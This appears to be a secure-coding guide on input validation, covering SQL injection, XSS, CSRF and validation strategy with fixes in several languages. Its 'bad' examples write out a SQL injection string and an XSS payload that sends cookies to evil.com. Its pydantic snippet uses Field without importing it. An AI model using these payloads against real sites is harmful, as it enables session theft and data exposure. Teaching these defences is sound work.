# Input Validation

## What

Never trust user input. Every piece of data that comes from outside your code is potentially malicious, malformed, or wrong. Validate everything.

## Why It Matters

Input validation is your first line of defense. It prevents injection attacks, data corruption, and unexpected behavior. Most security vulnerabilities trace back to inadequate input handling.

## The Rule

Validate at the boundary. As soon as data enters your system, check it. Internal code should be able to trust the data it receives.

## Common Vulnerabilities

### SQL Injection

The classic. User input gets concatenated into a SQL query.

Bad:
```python
query = f"SELECT * FROM users WHERE name = '{user_input}'"
# User enters: ' OR '1'='1
# Query becomes: SELECT * FROM users WHERE name = '' OR '1'='1'
# Returns every user
```

Fix — use parameterized queries:
```python
cursor.execute("SELECT * FROM users WHERE name = %s", (user_input,))
```

```java
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE name = ?");
stmt.setString(1, userInput);
```

```go
row := db.QueryRow("SELECT * FROM users WHERE name = $1", userInput)
```

Every language has parameterized queries. Use them. Always.

### XSS (Cross-Site Scripting)

User input contains JavaScript that runs in another user's browser.

Bad — rendering user input as HTML:
```html
<div>Hello, {{ username }}</div>
<!-- User enters: <script>document.location='http://evil.com?c='+document.cookie</script> -->
```

Fix:
- Escape output. Convert `<` to `&lt;`, `>` to `&gt;`, etc.
- Use Content-Security-Policy headers
- Never render user input as raw HTML

### CSRF (Cross-Site Request Forgery)

A malicious site sends a request to your app using the user's existing session cookie.

Fix:
- Use anti-CSRF tokens — a random value in every form that the server validates
- Set `SameSite=Strict` on cookies
- Check the `Origin` or `Referer` header on state-changing requests

## OWASP Top 5 for Backend

1. **Broken Access Control** — Users accessing data they shouldn't. Fix: check permissions on every request, not just in the UI.
2. **Cryptographic Failures** — Storing passwords in plaintext, using weak algorithms. Fix: bcrypt for passwords, AES-256 for data at rest, TLS for transit.
3. **Injection** — SQL, NoSQL, OS command injection. Fix: parameterized queries, input validation, principle of least privilege.
4. **Insecure Design** — Missing threat modeling. Fix: think about abuse cases during design, not after.
5. **Security Misconfiguration** — Default credentials, open cloud storage, verbose errors. Fix: harden defaults, automate configuration checks.

## Validation Strategy

1. **Whitelist, don't blacklist.** Define what is allowed. Reject everything else. Checking for "known bad patterns" will miss new attacks.
2. **Validate type, length, format, range.**
   - Type: is it a number, string, email?
   - Length: is it within bounds?
   - Format: does it match a regex or pattern?
   - Range: is the number between min and max?
3. **Validate on the server.** Client-side validation is UX, not security. Anyone can bypass it.
4. **Sanitize for the context.** Data that is safe in SQL might be dangerous in HTML or a shell command. Escape for the output context.

```python
from pydantic import BaseModel, EmailStr, constr

class CreateUser(BaseModel):
    username: constr(min_length=3, max_length=50, pattern=r"^[a-zA-Z0-9_]+$")
    email: EmailStr
    age: int = Field(ge=0, le=150)
```

## Common Mistake

Validating "enough to not crash" instead of validating "enough to be safe." A valid email format does not mean the email is safe to concatenate into a shell command.
